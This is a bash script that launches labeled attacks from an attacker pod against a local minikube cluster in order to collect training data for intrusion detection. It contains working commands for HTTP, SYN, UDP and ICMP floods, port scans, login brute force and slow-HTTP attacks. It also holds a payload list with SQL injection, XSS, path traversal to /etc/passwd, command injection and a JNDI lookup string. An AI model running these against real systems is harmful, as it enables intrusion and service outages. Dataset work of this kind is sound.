#!/usr/bin/env bash
# One-command attack session for dataset collection against YOUR OWN local cluster.
# Snapshots pods, starts L7 log streaming (02) + L3/4 pcap capture (03), runs the
# selected attacks from an unmeshed attacker pod with clean gaps between them, writes
# a labels.csv (entry-point labeling: match_ua for L7, source_ip for L4/L3), then stops
# and fetches everything. See docs/build_dataset/attack-simulation.md and attack-types.md.
#
# SAFETY: for your own minikube cluster only. Floods are bounded-safe by default so the
# single node survives; --intense unlocks full-force. Teardown always runs (even Ctrl-C).
#
# Prereqs: ./00_setup_istio.sh done, app deployed (skaffold run), loadgenerator running,
#   images built:  docker build -f Dockerfile.attacker -t attacker:local .
#                  docker build -f Dockerfile.flowtools -t flowtools:local .   (for step 04)
#
# Usage:
#   ./05_run_attacks.sh                           # full suite, 2 rounds, bounded-safe
#   ./05_run_attacks.sh --only brute_force,port_scan --rounds 1
#   ./05_run_attacks.sh --no-l34                  # L7 application attacks only
#   ./05_run_attacks.sh --intense                 # full-force floods (can crash 1 node)
#   ./05_run_attacks.sh --dry-run                 # print every command + label rows, run nothing
#
# After it finishes it prints the exact build_dataset.py / 04_pcap_to_flows.sh commands.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"

# ---- defaults -------------------------------------------------------------------
ROUNDS=2
DUR=30            # seconds per attack
GAP=45            # seconds of clean (normal-only) traffic between attacks
INTENSE=0
DRY=0
NO_L34=0
ONLY=""
SKIP=""
OUT="$HERE/session_$(date -u +%Y%m%dT%H%M%SZ)"
NS=default
GW_HOST="istio-ingressgateway.istio-system.svc.cluster.local"   # L7 target (gateway path)
POD=attacker

# L7 attacks labeled by User-Agent (match_ua); the rest labeled by attacker source_ip.
UA_ATTACKS="http_flood http_flood_low fuzzing injection brute_force"
L7_IP_ATTACKS="malformed_http slow_http"                        # L7 but no usable UA
L34_ATTACKS="port_scan conn_flood syn_flood udp_flood icmp_flood"
ALL_ATTACKS="http_flood http_flood_low fuzzing injection brute_force malformed_http slow_http port_scan conn_flood syn_flood udp_flood icmp_flood"

usage() { sed -n '2,30p' "$0"; exit "${1:-0}"; }
while [[ $# -gt 0 ]]; do
    case "$1" in
        --rounds) ROUNDS="$2"; shift 2 ;;
        --dur) DUR="$2"; shift 2 ;;
        --gap) GAP="$2"; shift 2 ;;
        --only) ONLY="$2"; shift 2 ;;
        --skip) SKIP="$2"; shift 2 ;;
        --out) OUT="$2"; shift 2 ;;
        --intense) INTENSE=1; shift ;;
        --no-l34) NO_L34=1; shift ;;
        --dry-run) DRY=1; shift ;;
        -h|--help) usage 0 ;;
        *) echo "unknown arg: $1" >&2; usage 2 ;;
    esac
done

csv() { local IFS=,; echo "$*"; }
contains() { case " $1 " in *" $2 "*) return 0 ;; *) return 1 ;; esac; }
now_ms() { date -u +"%Y-%m-%dT%H:%M:%S.%3NZ"; }

# ---- which attacks to run -------------------------------------------------------
build_selection() {
    local sel=""
    for a in $ALL_ATTACKS; do
        [[ -n "$ONLY" ]] && ! contains "${ONLY//,/ }" "$a" && continue
        [[ -n "$SKIP" ]] && contains "${SKIP//,/ }" "$a" && continue
        [[ "$NO_L34" == 1 ]] && contains "$L34_ATTACKS" "$a" && continue
        sel="$sel $a"
    done
    echo "$sel"
}

# is this attack labeled by User-Agent (L7) or by source_ip (L4/L3 + no-UA L7)?
ua_label() { contains "$UA_ATTACKS" "$1"; }

# the label class written to labels.csv (http_flood_low is still the http_flood class)
label_of() { [[ "$1" == "http_flood_low" ]] && echo http_flood || echo "$1"; }

# ---- the attack commands (run inside the attacker pod via `sh -c`) --------------
# $GW_HOST = gateway (L7); $TGT = a backend pod IP (L4/L3). Bounded by `timeout`.
attack_cmd() {
    local a="$1" ua; ua="atk-$(label_of "$a")"
    case "$a" in
    http_flood)      if [[ $INTENSE == 1 ]]; then echo "wrk -t4 -c 100 -d ${DUR}s -H 'User-Agent: $ua' http://$GW_HOST/";
                     else echo "wrk -t2 -c 20 -d ${DUR}s -H 'User-Agent: $ua' http://$GW_HOST/"; fi ;;
    http_flood_low)  echo "timeout -s INT $DUR sh -c 'while :; do curl -s -o /dev/null -A \"$ua\" http://$GW_HOST/; sleep 1; done'" ;;
    fuzzing)         echo "ffuf -u http://$GW_HOST/FUZZ -w /tmp/fuzz.txt -H 'User-Agent: $ua' -rate $([[ $INTENSE == 1 ]] && echo 0 || echo 50) -maxtime $DUR -s" ;;
    injection)       echo "timeout -s INT $DUR sh -c 'while read p; do curl -s -o /dev/null -A \"$ua\" \"http://$GW_HOST/product/\$p\"; curl -s -o /dev/null -A \"$ua\" \"http://$GW_HOST/?q=\$p\"; done < /tmp/inj.txt; exit 0'" ;;
    brute_force)     echo "timeout -s INT $DUR sh -c 'i=0; while :; do i=\$((i+1)); curl -s -o /dev/null -A \"$ua\" -XPOST http://$GW_HOST/login -H \"Content-Type: application/json\" -d \"{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"wrong\$i\\\"}\"; done'" ;;
    malformed_http)  echo "timeout -s INT $DUR sh -c 'while :; do printf \"GARBAGE /\\\\r\\\\n\\\\r\\\\n\" | ncat -w1 $GW_HOST 80; done'" ;;
    slow_http)       echo "slowhttptest -c $([[ $INTENSE == 1 ]] && echo 1000 || echo 200) -H -i 10 -r 50 -u http://$GW_HOST/ -l $DUR" ;;
    port_scan)       if [[ $INTENSE == 1 ]]; then echo "nmap -sS -Pn -T4 -p- \$TGT";
                     else echo "nmap -sT -Pn -T3 --max-rate 200 -p 1-1024,3550,5050,5000,7000,7070,8080,9555,50051,6379 \$TGT"; fi ;;
    conn_flood)      if [[ $INTENSE == 1 ]]; then echo "timeout -s INT $DUR hping3 -S -p 8080 --flood \$TGT";
                     else echo "timeout -s INT $DUR hping3 -S -p 8080 -i u5000 \$TGT"; fi ;;
    syn_flood)       if [[ $INTENSE == 1 ]]; then echo "timeout -s INT $DUR hping3 -S -p 80 --flood \$TGT";
                     else echo "timeout -s INT $DUR hping3 -S -p 80 -i u2000 \$TGT"; fi ;;
    udp_flood)       if [[ $INTENSE == 1 ]]; then echo "timeout -s INT $DUR hping3 --udp -p 53 --flood \$TGT";
                     else echo "timeout -s INT $DUR hping3 --udp -p 53 -i u2000 \$TGT"; fi ;;
    icmp_flood)      if [[ $INTENSE == 1 ]]; then echo "timeout -s INT $DUR hping3 --icmp --flood \$TGT";
                     else echo "timeout -s INT $DUR hping3 --icmp -i u2000 \$TGT"; fi ;;
    *) echo "echo 'unknown attack $a'; false" ;;
    esac
}

# ---- teardown (always) ----------------------------------------------------------
STREAM_PID=""
teardown() {
    echo; echo "==> teardown"
    [[ -n "$STREAM_PID" ]] && kill "$STREAM_PID" 2>/dev/null || true
    if [[ $DRY == 0 ]]; then
        "$HERE/03_capture_pcap.sh" fetch "$OUT/pcaps" >/dev/null 2>&1 || true
        "$HERE/03_capture_pcap.sh" stop  >/dev/null 2>&1 || true
        kubectl -n "$NS" delete pod "$POD" --wait=false >/dev/null 2>&1 || true
    fi
}
trap teardown EXIT INT TERM

# ---- preconditions --------------------------------------------------------------
SEL="$(build_selection)"
[[ -z "${SEL// }" ]] && { echo "no attacks selected" >&2; exit 2; }
echo "session out : $OUT"
echo "attacks     :$SEL"
echo "rounds      : $ROUNDS | dur ${DUR}s | gap ${GAP}s | intense=$INTENSE | l34=$([[ $NO_L34 == 1 ]] && echo off || echo on)"

mkdir -p "$OUT"
LABELS="$OUT/labels.csv"
echo 'start_time,end_time,label,source_ip,match_ua,notes' > "$LABELS"

add_label() {   # add_label <start> <end> <label> <src> <ua> <notes>
    echo "$1,$2,$3,$4,$5,$6" >> "$LABELS"
}

if [[ $DRY == 1 ]]; then
    echo; echo "=== DRY RUN (nothing executed) ==="
    TGT="<frontend-pod-ip>"
    for r in $(seq 1 "$ROUNDS"); do
        for a in $SEL; do
            cmd="$(attack_cmd "$a")"
            echo "--- round $r / $a  [$([[ $(ua_label "$a"; echo $?) == 0 ]] && echo match_ua=atk-$(label_of "$a") || echo source_ip=$TGT)]"
            echo "    kubectl exec $POD -- sh -c \"$cmd\""
            if ua_label "$a"; then add_label "<start>" "<end>" "$(label_of "$a")" "" "atk-$(label_of "$a")" "dry round $r";
            else add_label "<start>" "<end>" "$(label_of "$a")" "$TGT" "" "dry round $r"; fi
        done
    done
    echo; echo "would write labels.csv:"; cat "$LABELS"
    exit 0
fi

kubectl cluster-info >/dev/null 2>&1 || { echo "ERROR: no reachable cluster." >&2; exit 1; }
docker image inspect attacker:local >/dev/null 2>&1 \
    || { echo "ERROR: attacker:local image missing. Run: docker build -f Dockerfile.attacker -t attacker:local ." >&2; exit 1; }

# minikube (docker/podman driver) runs its own image store; the locally-built image
# must be loaded in or the pod can't pull it (ImagePullBackOff -> never Ready).
if command -v minikube >/dev/null 2>&1 && kubectl config current-context 2>/dev/null | grep -qx minikube; then
    if ! minikube image ls 2>/dev/null | grep -q 'attacker:local'; then
        echo "==> loading attacker:local into minikube"; minikube image load attacker:local
    fi
fi

# ---- start the capture session --------------------------------------------------
echo; echo "==> snapshot pods"; (cd "$OUT" && "$HERE/01_snapshot_pods.sh" >/dev/null); mv "$OUT"/pods_*.json "$OUT/" 2>/dev/null || true
echo "==> start L7 log streaming"; "$HERE/02_stream_logs.sh" "$NS" "$OUT/logs" >"$OUT/stream.out" 2>&1 & STREAM_PID=$!
echo "==> start L3/4 pcap capture"; "$HERE/03_capture_pcap.sh" start >/dev/null

# ---- deploy attacker pod, resolve targets ---------------------------------------
echo "==> deploy attacker pod"; kubectl apply -f "$HERE/attacker-pod.yaml" >/dev/null
kubectl -n "$NS" wait --for=condition=Ready pod/"$POD" --timeout=120s
ATTACKER_IP="$(kubectl -n "$NS" get pod "$POD" -o jsonpath='{.status.podIP}')"
TGT="$(kubectl -n "$NS" get pod -l app=frontend -o jsonpath='{.items[0].status.podIP}')"
echo "    attacker=$ATTACKER_IP  target(frontend)=$TGT"

# push the fuzzing wordlist + injection payloads into the pod
kubectl -n "$NS" exec -i "$POD" -- sh -c 'cat > /tmp/fuzz.txt' <<'WL'
admin
login
.env
.git/config
api
actuator
actuator/health
metrics
debug
config
backup
robots.txt
swagger
swagger-ui
健康
%2e%2e%2f
WL
kubectl -n "$NS" exec -i "$POD" -- sh -c 'cat > /tmp/inj.txt' <<'PL'
1' OR '1'='1
1%27%20OR%201=1--
<script>alert(1)</script>
%3Cscript%3Ealert(1)%3C/script%3E
../../../../etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
`id`
;cat /etc/passwd
${jndi:ldap://x}
PL

sleep 5     # a little clean baseline before the first attack

# ---- run the attacks ------------------------------------------------------------
run_attack() {
    local a="$1" r="$2" cmd start end lbl
    cmd="$(attack_cmd "$a")"; lbl="$(label_of "$a")"
    echo "  [round $r] $a (${DUR}s)"
    start="$(now_ms)"
    kubectl -n "$NS" exec "$POD" -- sh -c "$cmd" >/dev/null 2>&1 || true
    end="$(now_ms)"
    if ua_label "$a"; then add_label "$start" "$end" "$lbl" "" "atk-$lbl" "round$r"
    else add_label "$start" "$end" "$lbl" "$ATTACKER_IP" "" "round$r"; fi
}

for r in $(seq 1 "$ROUNDS"); do
    echo "==> round $r/$ROUNDS"
    for a in $SEL; do
        run_attack "$a" "$r"
        echo "     gap ${GAP}s (normal baseline)"; sleep "$GAP"
    done
done

# ---- done (teardown runs via trap) ----------------------------------------------
echo
echo "==> session complete. labels.csv:"
cat "$LABELS"
cat <<EOF

Next steps (build the dataset from this session):

  # L7 view
  python build_dataset.py --logs "$OUT/logs" --pods "$OUT/pods_*.json" \\
      --labels "$LABELS" --out_dir "$OUT/dataset"

  # L3/4 view (needs flowtools:local image)
  ./04_pcap_to_flows.sh "$OUT/pcaps/cap" "$LABELS" "$OUT/dataset/netflows.csv"

  # train
  python two_view_hetero_gat.py \\
      --netflows "$OUT/dataset/netflows.csv" --graphml "$OUT/dataset/observed_services.graphml"
EOF
